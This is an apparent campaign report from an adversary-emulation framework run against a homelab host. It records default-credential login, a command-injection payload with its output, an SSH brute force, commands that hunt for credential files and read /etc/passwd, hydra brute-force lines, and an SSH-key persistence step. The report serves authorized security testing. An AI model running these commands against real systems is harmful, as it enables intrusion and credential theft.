# MyTRE Campaign Report

> ⚠️ **Authorized use only.** This report documents a controlled security assessment performed on systems owned or explicitly authorized for testing.

## Campaign Overview

| Field | Value |
|-------|-------|
| Campaign | homelab_assessment |
| Started | 2026-10-12 08:30:16 UTC |
| Finished | 2026-10-12 08:31:20 UTC |
| Duration | 64.05s |
| Stages Run | 14 |
| Stages Succeeded | 12 |
| Report Generated | 2026-10-12 08:31:20 UTC |

## Executive Summary

Campaign **homelab_assessment** ran 14 ATT&CK-mapped technique(s), of which 12 succeeded. 2 stage(s) did not achieve their objective.

## Findings Summary

| # | Technique | ATT&CK ID | Tactic | Result | Severity | Duration |
|---|-----------|-----------|--------|--------|----------|----------|
| 1 | service-fingerprint | T1592 | reconnaissance | ❌ Failed | N/A | 0.00s |
| 2 | vuln-scan | T1595.002 | reconnaissance | ❌ Failed | N/A | 0.00s |
| 3 | http-default-creds | T1078 | initial-access | ✅ Success | High | 1.13s |
| 4 | command-injection | T1190 | initial-access | ✅ Success | High | 3.45s |
| 5 | ssh-brute-force | T1110.001 | credential-access | ✅ Success | Critical | 44.58s |
| 6 | creds-in-files | T1552 | credential-access | ✅ Success | Critical | 4.17s |
| 7 | account-discovery | T1087 | discovery | ✅ Success | Informational | 2.03s |
| 8 | process-discovery | T1057 | discovery | ✅ Success | Informational | 1.17s |
| 9 | network-config-discovery | T1016 | discovery | ✅ Success | Informational | 1.98s |
| 10 | file-directory-discovery | T1083 | discovery | ✅ Success | Informational | 1.78s |
| 11 | ssh-pivot | T1021.004 | lateral-movement | ✅ Success | Critical | 0.80s |
| 12 | lateral-tool-transfer | T1570 | lateral-movement | ✅ Success | Critical | 1.00s |
| 13 | ssh-authorized-key | T1098 | persistence | ✅ Success | Critical | 1.56s |
| 14 | local-file-stage | T1074.001 | exfiltration | ✅ Success | Critical | 0.00s |

## Artifacts Collected

**Discovered Hosts:**
- `100.98.206.31` — open ports: none recorded
  - Notes: SSH pivot confirmed as fareed

**Validated Accounts (usernames only):**
- `admin` — via http-default-creds, valid on: ['http://100.98.206.31:8080']
- `fareed` — via ssh-brute-force, valid on: ['100.98.206.31']

**Staged Files:**
- `/tmp/mytre_marker.txt` — Transferred to 100.98.206.31 via SFTP
- `testdata/stage4-test.txt` — explicitly configured staged file

**Persistence Indicators:**
- {'type': 'ssh_authorized_key', 'host': '100.98.206.31', 'key_comment': 'mytre-test'}

## Stage-by-Stage Details

### Stage 1: service-fingerprint (T1592)
- **Tactic:** reconnaissance
- **Result:** Failed
- **Severity:** N/A
- **Started:** 2026-10-12 08:30:16 UTC
- **Duration:** 0.00s
- **Summary:** No ports to fingerprint on 100.98.206.31 — run PortScan first

### Stage 2: vuln-scan (T1595.002)
- **Tactic:** reconnaissance
- **Result:** Failed
- **Severity:** N/A
- **Started:** 2026-10-12 08:30:16 UTC
- **Duration:** 0.00s
- **Summary:** No fingerprint data for 100.98.206.31 — run ServiceFingerprint before VulnScan

### Stage 3: http-default-creds (T1078)
- **Tactic:** initial-access
- **Result:** Success
- **Severity:** High
- **Started:** 2026-10-12 08:30:17 UTC
- **Duration:** 1.13s
- **Summary:** Valid web credentials found at http://100.98.206.31:8080/login.php: admin (tried 2 pairs)
- **Evidence:**
  - `login_url`: http://100.98.206.31:8080/login.php
  - `pairs_tried`: 2
  - `username`: admin

### Stage 4: command-injection (T1190)
- **Tactic:** initial-access
- **Result:** Success
- **Severity:** High
- **Started:** 2026-10-12 08:30:18 UTC
- **Duration:** 3.45s
- **Summary:** Command injection confirmed at http://100.98.206.31:8080/vulnerabilities/exec/ — payload: '127.0.0.1; id' — output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
- **Evidence:**
  - `endpoint`: http://100.98.206.31:8080/vulnerabilities/exec/
  - `payloads_tried`: 8
  - `successful_payload`: 127.0.0.1; id
  - `rce_output`: uid=33(www-data) gid=33(www-data) groups=33(www-data)

### Stage 5: ssh-brute-force (T1110.001)
- **Tactic:** credential-access
- **Result:** Success
- **Severity:** Critical
- **Started:** 2026-10-12 08:30:21 UTC
- **Duration:** 44.58s
- **Summary:** Valid credential found for user fareed on 100.98.206.31:22 (tried 13/13 passwords)
- **Evidence:**
  - `target`: 100.98.206.31
  - `port`: 22
  - `username`: fareed

### Stage 6: creds-in-files (T1552)
- **Tactic:** credential-access
- **Result:** Success
- **Severity:** Critical
- **Started:** 2026-10-12 08:31:06 UTC
- **Duration:** 4.17s
- **Summary:** Found 3 credential-bearing file(s)/location(s) on 100.98.206.31
- **Evidence:**
  - `target`: 100.98.206.31
  - `findings`: [{'command': "find /home /root -name '.env' -o -name '*.env' 2>/dev/null | head -5", 'output': '/home/fareed/wazuh-mail/relay.env\n/home/fareed/wazuh-docker/build-docker-images/wazuh-manager/config/permanent_data.env\n/home/fareed/wazuh-docker/.env'}, {'command': "find /etc -name '*.conf' | xargs grep -l 'password' 2>/dev/null | head -5", 'output': '/etc/sudo_logsrvd.conf\n/etc/firebird/4.0/firebird.conf\n/etc/security/pwhistory.conf\n/etc/debconf.conf\n/etc/reportbug.conf'}, {'command': "cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|mysql\\|ssh' | head -10", 'output': 'cat > ~/passwords.txt << \'EOF\'\npassword\ncat ~/passwords.txt\nhydra -l admin -P ~/passwords.txt 192.168.0.115 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -s 8080 -V\ncurl -v -d "username=admin&password=wrongpass123&Login=Login" http://192.168.0.115:8080/login.php 2>&1 | tail -30\nhydra -l admin -P ~/passwords.txt 192.168.0.115 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed:H=Cookie: security=low" -s 8080 -V\nhydra -l admin '}]

### Stage 7: account-discovery (T1087)
- **Tactic:** discovery
- **Result:** Success
- **Severity:** Informational
- **Started:** 2026-10-12 08:31:10 UTC
- **Duration:** 2.03s
- **Summary:** Account discovery on 100.98.206.31: 4 interactive account(s) found — ['root', 'sync', 'fareed', 'bruteforcetest']
- **Evidence:**
  - `target`: 100.98.206.31
  - `accounts`: ['root', 'sync', 'fareed', 'bruteforcetest']
  - `findings`: {'cat /etc/passwd | grep -v nologin | grep -v false | grep -v halt | grep -v shutdown': 'root:x:0:0:root:/root:/bin/bash\nsync:x:4:65534:sync:/bin:/bin/sync\nfareed:x:1000:1000:fareed,,,:/home/fareed:/bin/bash\nbruteforcetest:x:1001:1001::/home/bruteforcetest:/bin/bash', 'getent group sudo 2>/dev/null || grep sudo /etc/group': 'sudo:x:27:fareed', 'last -n 10 2>/dev/null': 'fareed   pts/1        192.168.0.113    Mon Oct 12 13:47 - still logged in\nfareed   pts/1        192.168.0.113    Mon Oct 12 12:41 - 13:45  (01:04)\nfareed   pts/1        192.168.0.113    Mon Oct 12 11:58 - 12:30  (00:32)\nfareed   pts/0        192.168.0.113    Mon Oct 12 09:32 - 13:56  (04:24)\nfareed   pts/1        192.168.0.113    Sun Oct 11 21:59 - 22:34  (00:34)\nfareed   pts/0        192.168.0.113    Sun Oct 11 17:51 - 02:06  (08:15)\nreboot   system boot  6.12.107+deb13-a Sun Oct 11 17:49 - sti', 'who 2>/dev/null': 'fareed   sshd         2026-10-12 14:01 (100.109.220.43)\nfareed   sshd pts/1   2026-10-12 13:47 (192.168.0.113)', 'id': 'uid=1000(fareed) gid=1000(fareed) groups=1000(fareed),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth),989(docker)'}

### Stage 8: process-discovery (T1057)
- **Tactic:** discovery
- **Result:** Success
- **Severity:** Informational
- **Started:** 2026-10-12 08:31:12 UTC
- **Duration:** 1.17s
- **Summary:** Process discovery on 100.98.206.31: captured 2 process listing(s)
- **Evidence:**
  - `target`: 100.98.206.31
  - `findings`: {'ps aux --sort=-%cpu | head -20': 'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nfareed    326417  100  0.1   9964  4660 ?        R    14:01   0:00 ps aux --sort=-%cpu\nroot      326406  4.1  0.2  19636 11408 ?        Ss   14:01   0:00 sshd-session: fareed [priv]\nfareed      1806  2.0 31.3 3939652 1220084 ?     Ssl  Oct11  24:24 /usr/share/wazuh-indexer/jdk/bin/java -Xshare:auto -Dopensearch.networkaddress.cache.ttl=60 -Dopensearch.networkaddress.cache.negative.ttl=10 -XX:+AlwaysPreTouch -Xss1m -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djna.nosys=true -XX:-OmitStackTraceInFastThrow -XX:+ShowCodeDetailsInExceptionMessages -Dio.netty.noUnsafe=true -Dio.netty.noKeySetOptimization=true -Dio.netty.recycler.maxCapacityPerThread=0 -Dio.netty.allocator.numDirectArenas=0 -Dlog4j.shutdownHookEnabled=false -Dlog4j2.disable.jmx=true -Djava.security.manager=allow -Djava.locale.providers=SPI,COMPAT -XX:+UseG1GC -XX:G1ReservePercent=25 -XX:InitiatingHeapOccupancyPercent=30 -Djava.io.tmpdir=/tmp/opense', "ps aux | grep -E '(apache|nginx|mysql|postgres|docker|wazuh|ssh)' | grep -v grep": 'root        1018  0.2  2.1 2651052 84192 ?       Ssl  Oct11   2:52 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock\nfareed      1806  2.0 31.3 3939652 1220084 ?     Ssl  Oct11  24:24 /usr/share/wazuh-indexer/jdk/bin/java -Xshare:auto -Dopensearch.networkaddress.cache.ttl=60 -Dopensearch.networkaddress.cache.negative.ttl=10 -XX:+AlwaysPreTouch -Xss1m -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djna.nosys=true -XX:-OmitStackTraceInFastThrow -XX:+ShowCodeDetailsInExceptionMessages -Dio.netty.noUnsafe=true -Dio.netty.noKeySetOptimization=true -Dio.netty.recycler.maxCapacityPerThread=0 -Dio.netty.allocator.numDirectArenas=0 -Dlog4j.shutdownHookEnabled=false -Dlog4j2.disable.jmx=true -Djava.security.manager=allow -Djava.locale.providers=SPI,COMPAT -XX:+UseG1GC -XX:G1ReservePercent=25 -XX:InitiatingHeapOccupancyPercent=30 -Djava.io.tmpdir=/tmp/opensearch-5383318941738066642 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/wazuh-indexer -XX:ErrorFile=/var/log'}

### Stage 9: network-config-discovery (T1016)
- **Tactic:** discovery
- **Result:** Success
- **Severity:** Informational
- **Started:** 2026-10-12 08:31:13 UTC
- **Duration:** 1.98s
- **Summary:** Network config discovery on 100.98.206.31: 5 data point(s) collected
- **Evidence:**
  - `target`: 100.98.206.31
  - `findings`: {'ip addr show 2>/dev/null || ifconfig 2>/dev/null | head -30': '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp1s0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000\n    link/ether 74:86:7a:14:51:d7 brd ff:ff:ff:ff:ff:ff\n    altname enx74867a1451d7\n3: wlp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000\n    link/ether 1c:3e:84:a4:91:43 brd ff:ff:ff:ff:ff:ff\n    altname wlx1c3e84a49143\n    inet 192.168.0.115/24 brd 192.168.0.255 scope global noprefixroute wlp2s0\n       valid_lft forever preferred_lft forev', 'ip route show 2>/dev/null || route -n 2>/dev/null': 'default via 192.168.0.1 dev wlp2s0 proto dhcp src 192.168.0.115 metric 3003 \n172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 \n172.18.0.0/16 dev br-9e742758e14b proto kernel scope link src 172.18.0.1 \n192.168.0.0/24 dev wlp2s0 proto dhcp scope link src 192.168.0.115 metric 3003', 'ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null | head -20': 'State  Recv-Q Send-Q               Local Address:Port  Peer Address:PortProcess                            \nLISTEN 0      4096                       0.0.0.0:9200       0.0.0.0:*                                      \nLISTEN 0      4096                       0.0.0.0:443        0.0.0.0:*                                      \nLISTEN 0      4096                 100.98.206.31:45417      0.0.0.0:*                                      \nLISTEN 0      128                        0.0.0.0:22         0.0.0.0:*                                      \nLISTEN 0      4096                       0.0.0.0:8000       0.0.0.0:*                                      \nLISTEN 0      4096                       0.0.0.0:8080       0.0.0.0:*                                      \nLISTEN 0      4096                       0.0', 'cat /etc/resolv.conf 2>/dev/null': '# Generated by dhcpcd from wlp2s0.dhcp, wlp2s0.dhcp6\n# /etc/resolv.conf.head can replace this line\nnameserver 49.205.171.194\nnameserver 49.207.34.210\nnameserver 2406:b400:8:1::2\nnameserver 2406:b400:50:7::2\n# /etc/resolv.conf.tail can replace this line', "cat /etc/hosts | grep -v '^#' | grep -v '^$'": '127.0.0.1\tlocalhost\n127.0.1.1\thomelab\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters'}

### Stage 10: file-directory-discovery (T1083)
- **Tactic:** discovery
- **Result:** Success
- **Severity:** Informational
- **Started:** 2026-10-12 08:31:15 UTC
- **Duration:** 1.78s
- **Summary:** File/directory discovery on 100.98.206.31: 4 location(s) enumerated
- **Evidence:**
  - `target`: 100.98.206.31
  - `findings`: {'ls -la /home/': 'total 16\ndrwxr-xr-x  4 root           root           4096 Oct  3 17:13 .\ndrwxr-xr-x 18 root           root           4096 Sep  5 22:09 ..\ndrwx------  2 bruteforcetest bruteforcetest 4096 Oct  3 17:13 bruteforcetest\ndrwx------ 11 fareed         fareed         4096 Oct 12 13:01 fareed', "ls -la /etc/ | grep -E '\\.(conf|cfg|ini)$' | head -10": '-rw-r--r--  1 root root    3981 May  6  2025 adduser.conf\n-rw-r--r--  1 root root    6422 Sep  5 22:15 ca-certificates.conf\n-rw-r--r--  1 root root    2967 Mar 10  2025 debconf.conf\n-rw-r--r--  1 root root    1706 May  6  2025 deluser.conf\n-rw-r--r--  1 root root    1274 Jun 26 20:53 dhcpcd.conf\n-rw-r--r--  1 root root     685 May  9 17:06 e2scrub.conf\n-rw-r--r--  1 root root    2584 Jan 28  2025 gai.conf\n-rw-r--r--  1 root root       9 Jul  4 14:35 host.conf\n-rw-r--r--  1 root root     708 Dec ', 'find /tmp /var/tmp -maxdepth 1 -type f 2>/dev/null | head -10': '/tmp/mytre_marker.txt\n/tmp/mytre-wazuh-test.txt\n/tmp/mytre-stage4-upload.bin\n/tmp/mytre_test_receiver.py', 'ls -la ~/.ssh/ 2>/dev/null || echo NOT_FOUND': 'total 12\ndrwx------  2 fareed fareed 4096 Oct 12 12:41 .\ndrwx------ 11 fareed fareed 4096 Oct 12 13:01 ..\n-rw-------  1 fareed fareed  170 Oct 12 13:59 authorized_keys'}

### Stage 11: ssh-pivot (T1021.004)
- **Tactic:** lateral-movement
- **Result:** Success
- **Severity:** Critical
- **Started:** 2026-10-12 08:31:17 UTC
- **Duration:** 0.80s
- **Summary:** SSH pivot to 100.98.206.31:22 as fareed — probe output: uid=1000(fareed) gid=1000(fareed) groups=1000(fareed),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugd
- **Evidence:**
  - `target`: 100.98.206.31
  - `port`: 22
  - `username`: fareed
  - `probe_command`: id && hostname && uname -a
  - `probe_output`: uid=1000(fareed) gid=1000(fareed) groups=1000(fareed),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth),989(docker)
homelab
Linux homelab 6.12.107+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.107-1 (2026-08-29) x86_64 GNU/Linux
  - `probe_stderr`: 

### Stage 12: lateral-tool-transfer (T1570)
- **Tactic:** lateral-movement
- **Result:** Success
- **Severity:** Critical
- **Started:** 2026-10-12 08:31:18 UTC
- **Duration:** 1.00s
- **Summary:** Transferred 54 bytes to 100.98.206.31:/tmp/mytre_marker.txt (remote size confirmed: 54 bytes)
- **Evidence:**
  - `target`: 100.98.206.31
  - `local_file`: C:\Users\User\AppData\Local\Temp\mytre_iomgcuik.txt
  - `remote_path`: /tmp/mytre_marker.txt
  - `local_size_bytes`: 54
  - `remote_size_bytes`: 54

### Stage 13: ssh-authorized-key (T1098)
- **Tactic:** persistence
- **Result:** Success
- **Severity:** Critical
- **Started:** 2026-10-12 08:31:19 UTC
- **Duration:** 1.56s
- **Summary:** Persistence established on 100.98.206.31:22 as fareed — SSH key added to ~/.ssh/authorized_keys (key comment: mytre-test)
- **Evidence:**
  - `target`: 100.98.206.31
  - `username`: fareed
  - `verification_output`: ['ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITestKeyForMyTREAuthorizedTestingOnly mytre-test']

### Stage 14: local-file-stage (T1074.001)
- **Tactic:** exfiltration
- **Result:** Success
- **Severity:** Critical
- **Started:** 2026-10-12 08:31:20 UTC
- **Duration:** 0.00s
- **Summary:** Staged 1 explicitly configured local file(s)
- **Evidence:**
  - `paths_configured`: ['testdata/stage4-test.txt']
  - `staged`: ['testdata/stage4-test.txt']
  - `missing`: []

---
*Generated by MyTRE — ATT&CK-Mapped Adversary Emulation Framework*